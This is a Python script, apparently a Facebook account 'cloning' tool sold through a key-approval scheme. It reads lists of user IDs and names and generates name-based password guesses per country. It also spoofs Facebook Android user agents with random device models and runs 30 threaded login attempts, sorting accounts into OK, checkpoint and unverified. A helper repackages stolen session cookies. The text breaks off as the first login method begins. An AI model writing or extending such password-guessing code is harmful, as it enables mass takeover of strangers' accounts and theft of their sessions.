ExceptionM = "off"

import os, re, sys, uuid, json, time, string, random, hashlib, gzip, io, secrets, base64, urllib.parse, urllib, subprocess
from io import BytesIO
from pip._vendor import requests
from bs4 import BeautifulSoup
from string import *
from concurrent.futures import ThreadPoolExecutor as ThreadPool

W = '\033[1;97m'
G = '\033[38;5;46m'
R = '\033[38;5;196m'
B = '\x1b[38;5;45m'
Y = "\x1b[38;5;208m"
X = f"{W}!-!"
os.system('clear')

logo = f"""{W}

██╗     ██╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗  █████╗ ███████╗███████╗
██║     ██║   ██║████╗ ████║██╔══██╗██╔════╝ ██╔══██╗██╔══██╗╚══███╔╝╚══███╔╝
██║     ██║   ██║██╔████╔██║███████║██║  ███╗██║  ██║███████║  ███╔╝   ███╔╝ 
██║     ██║   ██║██║╚██╔╝██║██╔══██║██║   ██║██║  ██║██╔══██║ ███╔╝   ███╔╝  
███████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝██████╔╝██║  ██║███████╗███████╗
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                             
{W}--------------------------------------
 {X} Developer -> LUMAGDAZZ
 {X} Version   -> 22.0
 {X} Date Update   -> 19 Mar 2026
{W}--------------------------------------"""


def pp1():
    try:
        ky = open('/sdcard/Android/.nonmedia.js', 'r').read()
    except (FileNotFoundError):
        op = uuid.uuid1().hex.upper()
        try:
            open('/sdcard/Android/.nonmedia.js', 'w').write(op)
        except:
            # Fallback for Windows or non-android systems
            open('.approval_key', 'w').write(op)
        return pp1()
    except (KeyError, OSError, IOError):
        if os.name != 'nt':
            os.system('termux-setup-storage')
        print(' [×] allow storage permission ')
        # Try local path if /sdcard fails
        try:
            ky = open('.approval_key', 'r').read()
        except:
            return pp1()
    
    if len(ky) != 32:
        try: os.remove('/sdcard/Android/.nonmedia.js')
        except: pass
        try: os.remove('.approval_key')
        except: pass
        return pp1()

    os.system('clear' if os.name != 'nt' else 'cls')
    print(logo)
    print(' [•] Checking Your Key For Approval... ')
    try:
        system = requests.get("https://github.com/Lumagdazz1/Clone/blob/main/Approvalkey.txt").text
        if ky in system:
            print(' [√] Key Approved by Lumagdazz')
            print(f' \033[1;32mYour Key : {str(ky)} ')
            time.sleep(5)
            pass
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(logo)
            print(' [×] Copy this key and send to admin for approval')
            time.sleep(2)
            print(f' \033[1;31mYour Key : {str(ky)} ')
            #print(' \033[1;37m[\033[1;32m☞\033[1;37m]\033[1;32m 1500PHP \033[1;37m Approval For 30 days')
            input(' \033[1;37m Enter to Contact Your Admin ')
            xx = str(ky)
            os.system(f'xdg-open "https://t.me/@MarkMasaya1?text={xx}"')
            return pp1()
    except Exception as e:
        print(f" [!] Connection Error: {e}")
        time.sleep(2)
        return pp1()


class UsrAGnt:
    def getprop(self, prop):
        try:
            return subprocess.check_output(f"getprop {prop}", shell=True).decode('utf-8').strip()
        except:
            return ""
    
    #/ SIM MAINTENANCE
    
    def sim(self):
        operators = self.getprop("gsm.operator.alpha")
        default_sims = ["Grameenphone","Robi","Banglalink","Teletalk","Airtel"]
        
        if (not operators or "No service" in operators or "Unknown" in operators or "," not in operators):
            return random.choice(default_sims), random.choice(default_sims)
        
        try:
            fbcr = operators.split(',')
            fbcr1 = fbcr[0].strip()
            fbcr2 = fbcr[1].strip() if len(fbcr) > 1 else fbcr[0].strip()
            if not fbcr1 or not fbcr2:
                raise ValueError
            return fbcr1, fbcr2
        except:
            return random.choice(default_sims), random.choice(default_sims)
    
    #/ BUILD VERSION
    
    def buildvers(self):
        build = self.getprop("ro.build.id")
        
        if not build:
            return random.choice(["SP1A.", "TP2A.", "TP1A.", "RKQ1.", "RP1A.", "TQ3A.", "TD2A.", "TD4A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])+str(random.randint(222222, 777777))+"."+str(random.randint(1, 30)).zfill(3)
        
        try:
            parts = build.split(".")
            middle = parts[1]
            length = len(middle)
            start = int("2" * length)
            end = int("7" * length)
            parts[1] = str(random.randint(start, end))
            return ".".join(parts)
        except:
            return build
    
    #/ ANDROID VERSION
    
    def vrsion(self):
        fbsv = self.getprop("ro.build.version.release")
        
        if not fbsv:
            fbsv = str(random.randint(9,15))
        
        return fbsv
    
    #/ ARCHITECTURE 
    
    def arctecure(self):
        fbca = self.getprop("ro.product.cpu.abilist")
        
        if not fbca:
            fbca = random.choice(["arm64-v8a:null", "arm64-v8a", "arm64-v8a:armeabi-v7a:armeabi"])
        
        return fbca
    
    #/ LOCAL
    
    def local(self):
        fblc = self.getprop("persist.sys.locale")
        
        if not fblc:
            fblc = self.getprop("ro.product.locale")
    
        if not fblc:
            fblc = random.choice(["en_US","en_GB","en_IN","en_AU","en_CA","bn_IN","hi_IN","ur_PK","id_ID","vi_VN","th_TH","ar_AR","tr_TR","fr_FR","de_DE","it_IT","es_ES","pt_BR"])
        
        return fblc.replace("-", "_")
   
   #/ FBMF, FBBD, FBSV
   
    def samsung(self):
        samsungmodelT = ['SM-G991B', 'SM-G996B', 'SM-G998B', 'SM-A525F', 'SM-A526B', 'SM-A715F', 'SM-A736B', 'SM-A346E', 'SM-A226B', 'SM-M526B', 'SM-M536B', 'SM-M135F', 'SM-M336B', 'SM-F936B', 'SM-F711B', 'SM-S901B', 'SM-S906B', 'SM-S908B', 'SM-A047F', 'SM-A146P']
        return "samsung", "samsung", random.choice(samsungmodelT)
    
    def vivo(self):
        vivoModelT = ["vivo 1002T","vivo 1601","vivo 1603","vivo 1606A","vivo 1609","vivo 1610","vivo 1611","vivo 1612","vivo 1613","vivo 1707","vivo 1713","vivo 1714","vivo 1716","vivo 1718","vivo 1719","vivo 1720","vivo 1723","vivo 1724","vivo 1726","vivo 1727","vivo 1730","vivo 1801","vivo 1802","vivo 1803","vivo 1804","vivo 1805","vivo 1806","vivo 1807","vivo 1808i","vivo 1809","vivo 1811","vivo 1812","vivo 1813","vivo 1814","vivo 1816","vivo 1817","vivo 1818","vivo 1819","vivo_1820","vivo 1820","vivo 1823","vivo 1835","vivo 1851","vivo 1901","vivo 1902","vivo 1902_19","vivo 1904","vivo 1906","vivo 1907","vivo 1907_19","vivo 1908","vivo 1908_19","vivo 1909","vivo 1910","vivo 1912","vivo 1913","vivo 1914","vivo 1915","vivo 1916","vivo 1917","vivo 1918","vivo 1919","vivo 1920","vivo 1921","vivo 1933","vivo 1935","vivo 1937","vivo 1938","vivo 1951","vivo_1951","vivo 1906","vivo 1814","vivo 1915","vivo 1802","vivo 1811","vivo 1820","vivo 1827","vivo 1831","vivo 1837","vivo 1851","vivo 1855","vivo 1862","vivo 1876","vivo 1881","vivo 1887","vivo 1891","vivo 1893","vivo 1896","vivo 1901","vivo 1904","vivo 1907","vivo 1911","vivo 1917","vivo 1920","vivo 1921","vivo 1927","vivo 1933","vivo 1935","vivo 1937","vivo 1941","vivo 1943","vivo 1945","vivo 1946","vivo 1951","vivo 1955","vivo 1957","vivo 1959","vivo 1962","vivo 1965","vivo 1968","vivo 1971","vivo 1973","vivo 1975","vivo 1977","vivo 1981","vivo 1985","vivo 1987","vivo 1990","vivo 1993","vivo 1995"]
        return "vivo", "vivo", random.choice(vivoModelT)
    
    def realme(self):
        realmeModelT = ['RMX3560', 'RMX3561', 'RMX3393', 'RMX3366', 'RMX3310', 'RMX3311', 'RMX3261', 'RMX3265', 'RMX3511', 'RMX3501', 'RMX3502', 'RMX3471', 'RMX3271', 'RMX3473', 'RMX3085', 'RMX3195', 'RMX3191', 'RMX3357', 'RMX3301', 'RMX3307']
        return "Realme", "Realme", random.choice(realmeModelT)
    
    def huwai(self):
        HuwaiModelT = ['HUAWEI ANA-NX9', 'HUAWEI ELS-NX9', 'HUAWEI ELS-N29', 'HUAWEI ELS-NX0', 'HUAWEI JNY-LX1', 'HUAWEI JNY-L21', 'HUAWEI JNY-LX3', 'HUAWEI MRD-AL00', 'HUAWEI MRD-TL00', 'HUAWEI NLE-AL00', 'HUAWEI NLE-TL00', 'HUAWEI NOH-NX9', 'HUAWEI PPA-LX1', 'HUAWEI PPA-LX3', 'HUAWEI PRA-AL00', 'HUAWEI PRA-TL00', 'HUAWEI YAL-L21', 'HUAWEI YAL-AL00', 'HUAWEI YAL-L41', 'HUAWEI YAL-L41A']
        return "HUAWEI", "HUAWEI", random.choice(HuwaiModelT)
    
    def nokia(self):
        NokiaModelT = ['TA-1337', 'TA-1449', 'TA-1463', 'TA-1476', 'TA-1479', 'TA-1481', 'TA-1492', 'TA-1496', 'TA-1510', 'TA-1548', 'TA-1554', 'TA-1562', 'TA-1577', 'TA-1590', 'TA-1607', 'TA-1612', 'TA-1620', 'TA-1627', 'TA-1636', 'TA-1645']
        return "HMD Global", "Nokia", random.choice(NokiaModelT)
    
    def sony(self):
        sonyModelT = ['XQ-BC52', 'XQ-BC51', 'XQ-CC52', 'XQ-CC42', 'XQ-CC62', 'XQ-AS72', 'XQ-AS62', 'XQ-AS42', 'XQ-AU52', 'XQ-AU51', 'XQ-AU62', 'XQ-AU71', 'XQ-AU42', 'XQ-BE42', 'XQ-BE72', 'XQ-BE62', 'XQ-BE55', 'XQ-BE56', 'XQ-BE42', 'XQ-BE52']
        return "Sony", "Sony", random.choice(sonyModelT)
    
    def oppo(self):
        oppoModelT = ['CPH2339', 'CPH2375', 'CPH2381', 'CPH2417', 'CPH2421', 'CPH2467', 'CPH2471', 'CPH2483', 'CPH2307', 'CPH2387', 'CPH2365', 'CPH2431', 'CPH2205', 'CPH2247', 'CPH2356', 'CPH2269', 'CPH2385', 'CPH2449', 'PHT110', 'PGW110']
        return "OPPO", "OPPO", random.choice(oppoModelT)
    
    def infinix(self):
        InfinixModelT = ['Infinix X6815', 'Infinix X6815C', 'Infinix X6816', 'Infinix X6816C', 'Infinix X6821', 'Infinix X6823', 'Infinix X6825', 'Infinix X6826', 'Infinix X6827', 'Infinix X665B', 'Infinix X665E', 'Infinix X6716', 'Infinix X678B', 'Infinix X665', 'Infinix X665D', 'Infinix X6832', 'Infinix X6833', 'Infinix X690', 'Infinix X688C', 'Infinix X666']
        return "Infinix", "Infinix", random.choice(InfinixModelT)
    
    def oneplus(self):
        oneplusModelT = ['LE2113', 'LE2123', 'LE2133', 'NE2213', 'NE2215', 'CPH2411', 'CPH2413', 'CPH2447', 'CPH2437', 'CPH2461', 'CPH2481', 'GM1913', 'GM1911', 'IN2013', 'IN2023', 'KB2003', 'KB2005', 'DN2103', 'PGKM10', 'PJD110']
        return "OnePlus", "OnePlus", random.choice(oneplusModelT)
    
    def google(self):
        GoogleModelT = ["Pixel XL", "Pixel 2", "Pixel 2 XL","Pixel 3", "Pixel 3 XL", "Pixel 3a", "Pixel 3a XL","Pixel 4", "Pixel 4 XL", "Pixel 4a", "Pixel 4a 5G","Pixel 5", "Pixel 5a", "Pixel 5a 5G","Pixel 6", "Pixel 6 Pro", "Pixel 6a","Pixel 7", "Pixel 7 Pro", "Pixel 7a","Pixel 8", "Pixel 8 Pro", "Pixel 8a","Pixel 9", "Pixel 9 Pro", "Pixel 9 Pro XL","Pixel 6 XL", "Pixel 7 Ultra","Pixel 8 Ultra", "Pixel 8s", "Pixel 8s Pro","Pixel 9a", "Pixel 9 Ultra", "Pixel 9 Fold","Pixel 10", "Pixel 10 Pro", "Pixel 10 Ultra","Pixel 10a", "Pixel 10 Fold", "Pixel 10 XL",]
        return "Google", "google", random.choice(GoogleModelT)
    
    def techno(self):
        TecnoModelT = ['TECNO CA8j', 'TECNO CA8k', 'TECNO CA8l', 'TECNO CA8m', 'TECNO CA8n', 'TECNO CA9m', 'TECNO CA9n', 'TECNO CA9p', 'TECNO CA9q', 'TECNO CB2j', 'TECNO CB2k', 'TECNO CB2l', 'TECNO CB2m', 'TECNO CB2n', 'TECNO CB2p', 'TECNO CB2q', 'TECNO CB3j', 'TECNO CB3k', 'TECNO CB3l', 'TECNO CB3m']
        return "TECNO", "TECNO", random.choice(TecnoModelT)
    
    def lava(self):
        LavaModelT = ["Z1", "Z2", "Z2s", "Z3", "Z4", "Z6", "Z50", "Z60", "Z61", "Z61 Pro", "Z66", "Z70", "Z71", "Z80", "Z81", "Z90", "Z92", "Z93", "Z95", "Z97", "A1", "A3", "A5", "A7", "A9", "A32", "A44", "A50", "A52"]
        return "LAVA", "LAVA", random.choice(LavaModelT)
    
    def itel(self):
        ItelmodelT = ["Itel S32", "Itel S33", "Itel A665L", "Itel S661LP", "Itel S661L", "Itel A16", "Itel C671L", "Itel S661W", "Itel S662LCN", "Itel P663LN", "Itel P683L", "Itel A6610L", "Itel P663LN", "Itel W5006X", "Itel A507LVU", "Itel P10003L", "Itel L6502"]
        return "ITEL MOBILE LIMITED", "Itel", random.choice(ItelmodelT)
    
    def redmi(self):
        RedmiModelT = ['Redmi Note 11', 'Redmi Note 11 Pro', 'Redmi Note 11S', 'Redmi Note 12', 'Redmi Note 12 Pro', 'Redmi Note 13', 'Redmi Note 13 Pro', 'Redmi 10', 'Redmi 10C', 'Redmi 11 Prime', 'Redmi 12', 'Redmi 12C', 'Redmi Note 10', 'Redmi Note 10 Pro', 'Redmi Note 10S', 'Redmi Note 9']
        return "Xiaomi", "Redmi", random.choice(RedmiModelT)
    
    def poco(self):
        pocomodelT = ['POCO X4 Pro 5G', 'POCO F4', 'POCO X5 5G', 'POCO X5 Pro 5G', 'POCO F5', 'POCO F5 Pro', 'POCO M4 Pro 5G', 'POCO M5', 'POCO M5s', 'POCO X4 GT', 'POCO X3 Pro', 'POCO F3', 'POCO C55', 'POCO C65', 'POCO M6 Pro 5G', 'POCO X3 GT', 'POCO M4 Pro (4G)', 'POCO F4 GT', 'POCO M6', 'POCO C51']
        return "Xiaomi", "POCO", random.choice(pocomodelT)
    
    def asus(self):
        AsusModelT = ['ASUS_I007D', 'ASUS_I005DA', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_I001DA', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00T_1', 'ASUS_Z01KD', 'ASUS_Z01KD_1', 'ASUS_Z01RD', 'ASUS_Z01RD_1', 'ASUS_Z01QD', 'ASUS_Z01QD_1', 'ASUS_Z01QD_2', 'ASUS_Z01HDA', 'ASUS_Z01HDA_1', 'ASUS_Z01MDA', 'ASUS_Z01MDA_1', 'ASUS_Z01QD_3']
        return "asus", "asus", random.choice(AsusModelT)
    
    def motorola(self):
        MotorolaModelT = ['moto g82', 'moto g71', 'moto g51', 'moto g31', 'moto g60', 'moto g100', 'moto edge 30', 'moto edge 20', 'moto edge 20 pro', 'moto one 5g ace', 'moto one 5g', 'moto g stylus 5g', 'moto g power 2022', 'moto g play 2021', 'moto g pure', 'moto g50', 'moto g30', 'moto e7 plus', 'moto e7 power', 'moto e6s']
        return "motorola", "motorola", random.choice(MotorolaModelT)
    
    def lge(self):
        LGeModelT = ["LG-H818", "LG-H815", "LG-H810", "LG-H811", "LG-H818P", "LG-H910", "LG-H930", "LG-H932", "LG-H933", "LG-H950", "LG-H955", "LG-H990", "LG-V20", "LG-V30", "LG-K10", "LG-K20", "LG-K30", "LG-K40", "LG-K41S", "LG-K50", "LG-K51S", "LG-K60", "LG-K61", "LG-K62", "LG-K71", "LG-K92", "LG-Q6", "LG-Q7", "LG-Q8", "LG-Q60", "LG-Q70", "LG-Q92", "LG-TP450", "LG-H901", "LG-H818P", "LG-H955", "LG-H990"]
        return "LGE", "lge", random.choice(LGeModelT)
    
    def wiko(self):
        wikomodelT = ["W-V5", "W-V5P", "W-Y80", "W-Y61", "W-Y52",  "W-J4", "W-PU30", "W-PU10", "W-UFP", "W-UF",  "W-H2", "W-R", "W-S2", "W-V4", "W-V4L",  "W-V4P", "W-UP", "W-PF4G", "W-P4G", "W-L4",  "W-T3", "W-R4G", "W-W", "W-DF", "W-RL",  "W-S", "W-HS", "W-HS", "W-L3", "W-C5",  "W-CK", "W-G", "W-UFL", "W-L", "W-R4G",  "W-F", "W-WIM", "W-WIML", "W-P3G", "W-V3",  "W-V3L", "W-V3P", "W-R", "W-H", "W-Y50",  "W-Y20", "W-Y40", "W-V2", "W-V2P", "W-UM",  "W-UFL", "W-P2", "W-S", "W-S", "W-CP2",  "W-CP", "W-HS", "W-HS", "W-HS", "W-DF",  "W-CP2", "W-CK", "W-UF", "W-Y40", "W-Y30",  "W-Y10", "W-Y50", "W-Y20", "W-Y30", "W-V3",  "W-V3P", "W-V3L", "W-F", "W-R", "W-H2",  "W-V4P", "W-PU20", "W-Y80", "W-UFP", "W-P4G",  "W-UM", "W-UFL", "W-P2", "W-CS", "W-C54G",  "W-Y60", "W-Y40", "W-Y20", "W-Y10", "W-Y30",  "W-L", "W-T", "W-CK", "W-F", "W-HP",  "W-HS", "W-HS", "W-DF", "W-CS2", "W-R",  "W-J", "W-S3", "W-Y80", "W-UF", "W-Y20"]
        return "Wiko", "wiko", random.choice(wikomodelT)
    
    def amazon(self):
        amazonmodelT = ["SD4930UR", "KFMUWI", "KFARWI", "KFMAWI", "B08MWL8", "B08L5M8", "B07KX1F1L6", "KFSOWI", "B00G1GR0XG", "KFTHWA", "B08C1FZ5KJ", "B01JX9Z0Z4", "B08H7RXN61", "B08H8GVZHQ", "B08H7RXN61", "B08FB1X4L6", "B01LYHHU7P", "B08FB1X4L6", "B08H7RXN61", "B08H8GVZHQ", "B09MYNR9HD", "B09MWLGWYX", "B08FB1X4L6", "B09MYNR9HD", "B08FB1X4L6", "B00G1GR0XG", "B07KX1F1L6", "B00KXS7IS6", "B08H7RXN61", "B01KXYA72C", "B08JZ1F4C1", "B07FJYZ9GQ", "B08FB1X4L6", "B08H8GVZHQ", "B08FB1X4L6", "B08FB1X4L6", "B01LYHHU7P", "B08H8GVZHQ", "B07KX1F1L6", "B00G1GR0XG", "B09MYNR9HD", "B07KX1F1L6", "B08FB1X4L6", "B00KXS7IS6", "B08C1FZ5KJ", "B08FB1X4L6", "B01LYHHU7P", "B08H8GVZHQ", "B07KX1F1L6", "B08FB1X4L6", "B00T5YH0JW", "B09MYNR9HD", "B08C1FZ5KJ", "B08FB1X4L6", "B08FB1X4L6", "B08H8GVZHQ", "B08FB1X4L6", "B08FB1X4L6", "B08MWL8", "B08H8GVZHQ", "B09MYNR9HD", "B08FB1X4L6", "B08C1FZ5KJ", "B08FB1X4L6", "B08H8GVZHQ", "B08H8GVZHQ", "B08H8GVZHQ", "B08H7RXN61", "B08FB1X4L6", "B08H8GVZHQ", "B08MWL8", "B08H8GVZHQ", "B08FB1X4L6", "B08FB1X4L6", "B08C1FZ5KJ", "B08C1FZ5KJ"]
        return "Amazon", "amazon", random.choice(amazonmodelT)
    
    def honor(self):
        HonorModelT = ['SEA-AL10', 'SEA-TL10', 'DAN-AL00', 'DAN-LX9', 'DAN-LX3', 'JAT-LX1', 'JAT-LX3', 'JNY-LX1', 'JNY-LX3', 'HLK-AL00', 'HLK-TL00', 'HLK-AL10', 'NNE-AN00', 'NNE-TN00', 'NNE-AL00', 'NNE-AN10', 'BKL-AL20', 'BKL-TL00', 'BKL-AL10', 'BKL-AL50']
        return "HUAWEI", "HONOR", random.choice(HonorModelT)
    
    def UserXngt(self):
        try:
            fbmf, fbbd, fbdv = self.samsung()
        except:
            fbmf, fbbd, fbdv = self.getprop("ro.product.manufacturer"), self.getprop("ro.product.brand"), self.getprop("ro.product.model")
        
        chrme = f"{str(random.randint(84, 106))}.0.{str(random.randint(4200, 4900))}.{str(random.randint(40, 140))}"
        miuu = f"Mozilla/5.0 (Linux; Android {self.vrsion()}; {fbdv} Build/{self.buildvers()}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(chrme)} Mobile Safari/537.36"
        dalv = f"Dalvik/2.1.0 (Linux; U; Android {self.vrsion()}; {fbdv} Build/{self.buildvers()}) "
        fbax = f"[FBAN/FB4A;FBAV/{str(random.randint(11, 99))}.0.0.{str(random.randint(1111, 9999))};FBBV/{str(random.randint(1111111, 9999999))};"
        da_fb = str(random.choice([fbax,dalv,miuu]))
        sim1, sim2 = self.sim()
        density = lambda: f"{{density={random.choice([2.0, 2.5, 3.0, 3.5, 4.0])},width={random.choice([720, 1080, 1440])},height={random.randint(1280, 2600)}}}"
        
        return f"[FBAN/FB4A;FBAV/{random.randint(320,420)}.0.0.{random.randint(20,60)}.{random.randint(80,200)};FBBV/{random.randint(100000000,999999999)};FBDM/{density()};FBLC/{self.local()};FBRV/0;FBCR/{random.choice([sim1, sim2])};FBMF/{fbmf};FBBD/{fbbd};FBPN/com.facebook.katana;FBDV/{fbdv};FBSV/{self.vrsion()};FBOP/1;FBCA/{self.arctecure()};]"

class LGM:
    def __init__(self):
        self.plist = []
        self.oks = []
        self.nvs = []
        self.cps = []
        self.loop = 0
        self.total = 0
        self.user = []
        self.session = requests.Session()
        self.oksx = []
        self.fstr = []
        self.manualT = []
        self.novs = []
       # print(self.useragent(usrmozil="5"))
        self.faster()
    
    def _S_(self):
        self.clear()
        print(logo)
        print(f"{W} [{G}1{W}] File Cloning {W}[{G}Available{W}]\n [{R}•{W}] Number Cloning {W}[{G}Coming Soon{W}]\n [{R}•{W}] Old Uid Cloning {W}[{G}Coming Soon{W}]\n [{R}•{W}] Instagram Cloning {W}[{G}Coming Soon{W}]\n [{G}0{W}] Contact Admin")
        self.linex()
        x = input(f" {X} Choice ~>> ")
        if x == "1":
            self.file()
        elif x == "2":
            self.rnd()
        elif x == "3":
            self.old()
        elif x == "0":
            self.admin()
        else:
            self._S_()
    
    def admin(self):
        self.clear()
        print(logo)
        print(f"{W} [{G}1{W}] WhatsApp\n [{G}2{W}] Telegram")
        self.linex()
        x = input(f" {X} Choice ~>> ")
        if x == "1":
            os.system("xdg-open https://wa.me/+639362092829")
            self._S_()
        elif x == "2":
            os.system("xdg-open https://t.me/@MarkMasaya1")
            self._S_()
        else:
            self._S_()
    
    def faster(self):
        os.system("clear")
        print(f"\n\n\n\n\n {X} {R}N{W} Is {B}Better{W} Then {G}Y{W} ")
        crck = input(f"\n\n {X} Faster Mode Enable [{G}Y{W}/{R}N{W}] ~>> ").lower()
        if crck == "y":
            self.fstr.append("graph")
        else:
            self.fstr.append("b-graph")
        os.system("clear")
        self._S_()
    
    def logoX(self, rex="Menu"):
        logo = f"""{W}

██╗     ██╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗  █████╗ ███████╗███████╗
██║     ██║   ██║████╗ ████║██╔══██╗██╔════╝ ██╔══██╗██╔══██╗╚══███╔╝╚══███╔╝
██║     ██║   ██║██╔████╔██║███████║██║  ███╗██║  ██║███████║  ███╔╝   ███╔╝ 
██║     ██║   ██║██║╚██╔╝██║██╔══██║██║   ██║██║  ██║██╔══██║ ███╔╝   ███╔╝  
███████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝██████╔╝██║  ██║███████╗███████╗
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                             
{W}--------------------------------------
 {X} Connection -> {str(self.con_type())}
 {X} Using -> {str(rex)}
{W}--------------------------------------"""
        return logo
    
    def con_type(self):
        try:
            net = subprocess.getoutput("ifconfig")
            if "wlan0" in net:
                return "Wi-Fi"
            elif "rmnet" in net or "ccmni" in net or "tun0" in net:
                return "Mobile Data"
            else:
                return "Unknown"
        except:
            return "Unknown"
    
    def passx(self, pas):
        pax = str(random.choice(["PWD_FB4A", "PWD_BROWSER"]))
        return "#"+str(pax)+":0:{}:{}".format(str(time.time()).split('.')[0], str(pas))
    
    def loclevlUX(self, ua):
        fblcXX = re.findall("FBLC/(.*?);",str(ua))[0]
        fblxxX = re.findall("FBLC/(.*?);",str(ua))[0].split("_")[1]
        return fblcXX, fblxxX
    
    def convert(self, cookie_str):
        cookie = dict(item.split("=", 1) for item in cookie_str.split(";"))
        cok = "sb={};datr={};c_user={};xs={};fr={}".format(cookie.get("sb", ""),cookie.get("datr", ""),cookie.get("c_user", ""),cookie.get("xs", ""),cookie.get("fr", ""))
        return cok
    
    def results(self):
        if len(self.oks) < 1:
            print()
            self.linex()
            print(f"\r\r {X} This mathod is not working at now ..")
            print(f" {X} Use another mathod for ok ID'S ..")
        if len(self.oks) > 0:
            print()
            self.linex()
            print(f" {X} Review on fb-group and post ss ..! ")
            print(f" {X} Thanks for use the tool ..!")
        self.linex()
        print(f' {X} Save as  {W}: {R}[{G}/sdcard/****{R}] ')
        print(f' {X} Total OK {W}:{G} %s' % str(len(self.oks)))
        print(f' {X} Total CP {W}:{R} %s' % str(len(self.cps)))
        print(f' {X} Total NV {W}:{R} %s' % str(len(self.novs)))
        self.linex()
        sys.exit('')   
    
    def clear(self):
        os.system("clear")

    def linex(self):
        print(f"{W}--------------------------------------")

    def file(self):
        self.clear()
        print(self.logoX(rex="File"))
        file = input(f" {X} File Path ~>> ")
        self.linex()
        try:
            with open(file) as f:
                tani = f.read().splitlines()
        except FileNotFoundError:
            print(f" {X}{R} File Location Not Found ....")
            time.sleep(1)
            self.file()
            return
        print(f" [{G}1{W}] Auto Pass \n [{G}2{W}] Choice Pass {W}[{G}Best{W}]\n [{G}3{W}] CP Pass {W}[{G}Only CP File{W}] \n [{G}4{W}] Update Pass [{G}SOON{W}]")
        self.linex()
        pstype = input(f" {X} Choice ~>> ")
        if pstype == "1":
            self.clear()
            print(self.logoX(rex="File"))
            print(f" [{G}1{W}] Bangladesh Pass ")
            print(f" [{G}2{W}] Nepal Pass ")
            print(f" [{G}3{W}] Pakisthan Pass ")
            print(f" [{G}4{W}] India Pass ")
            print(f" [{G}5{W}] Nigiria Pass ")
            #print(f" [{G}6{W}] Nigiria Pass ")
            self.linex()
            country = input(f" {X} Choice ~>> ")
            if country == "1":
                for pasx in ["name","firstlast","first1234","last1234","first123","last123","first12","last12","first@123","last@123","first@1234","last@1234","firstlast12","first first"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "2":
                for pasx in ["name","firstlast","first1234","last1234","first123","last123","first12","last12","first@123","last@123","first@1234","last@1234","firstlast12","first first"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "3":
                for pasx in ["name","firstlast","first1234","last1234","first123","last123","first12","last12","first@123","last@123","first@1234","last@1234","firstlast12","first first"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "4":
                for pasx in ["name","firstlast","first1234","last1234","first123","last123","first12","last12","first@123","last@123","first@1234","last@1234","firstlast12","first first"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "5":
                for pasx in ["name","firstlast","first1234","last1234","first123","last123","first12","last12","first@123","last@123","first@1234","last@1234","firstlast12","first first"]:
                    self.plist.append(pasx)
                self.linex()
        elif pstype == "3":
            for pasx in ["name"]:
                self.plist.append(pasx)
            self.linex()
        elif pstype == "c":
            for pasx in ["first","First","FIRST","name","last","Last","LAST"]:
                self.plist.append(pasx)
            self.linex()
        else:
            self.linex()
            try:pslimit = int(input(f" {X} Pass limit ~>> "))
            except:pslimit = 8
            self.linex()
            print(f" {X} Example : first123, last@, etc...")
            print(f" {X} Example : First123, Last@, etc...")
            print(f" {X} Example : FIRST123, LAST@, etc...")
            self.linex()
            for x in range(pslimit):
                pwx = input(f" {X} Put Pass {G}{x+1}{W} ~>> ")
                self.plist.append(pwx)
        
        print(f" {X} Method {G}1 ")
        print(f" {X} Method {G}2 ")
        #print(f" {X} Method {G}3 {R}[{W}2F{R}/{W}OK{R}] {R}[{W}UPDATED{R}]")
        #print(f" {X} Method {G}4 {R}[{W}2F{R}/{W}OK{R}] {R}[{W}UPDATED{R}]")
        #print(f" {X} Method {G}5 {W}[{G}HOST{W}]")
        #print(f" {X} Method {G}6")
        #print(f" {X} Method {G}7")
        self.linex()
        mtd = input(f" {X} Choice ~>> ")
        self.clear()
        print(self.logoX(rex="File"))
        tl = str(len(tani))
        print(f" {X} Total Uid|Pass : {G}{tl}{W}|{G}{len(self.plist)} ")
        self.linex()
        with ThreadPool(max_workers=30) as executor:
            for user in tani:
                try:
                    ids, names, cookies = user.split('|')
                except (KeyError, ValueError):
                    ids, names = user.split('|')
                finally:pass
                passlist = self.plist
                if mtd == "1":
                    executor.submit(self._S1_, ids, names, passlist, tl)
                elif mtd == "2":
                    executor.submit(self._S2_, ids, names, passlist, tl)
                elif mtd == "3":
                    executor.submit(self._S3_, ids, names, passlist, tl)
                elif mtd == "4":
                    executor.submit(self._S4_, ids, names, passlist, tl)
                elif mtd == "5":
                    executor.submit(self._S5_, ids, names, passlist, tl)
                elif mtd == "6":
                    executor.submit(self._S6_, ids, names, passlist, tl)
                elif mtd == "7":
                    executor.submit(self._S7_, ids, names, passlist, tl)
        self.results()
    
    def _S1_(self, ids, names, passlist, tl):
        rndclr=random.choice(['\033[1;97m','\033[38;5;46m','\033[38;5;196m','\x1b[38;5;45m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r {W}[{rndclr}S1{W}] {self.loop}|{'{:.1%}'.format(self.loop/int(tl))} {G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}|{B}{len(self.novs)}{W}"),
        sys.stdout.flush()
        try:
            np = names.split(' ')
            if len(np) == 1:first = np[0];last = random.choice(['khan','hasan','sheikh'])
            elif len(np) == 3:first = np[1];last = np[2]
            else:first = np[0];last = np[1]
            for fikr in passlist:
                with requests.Session() as session:
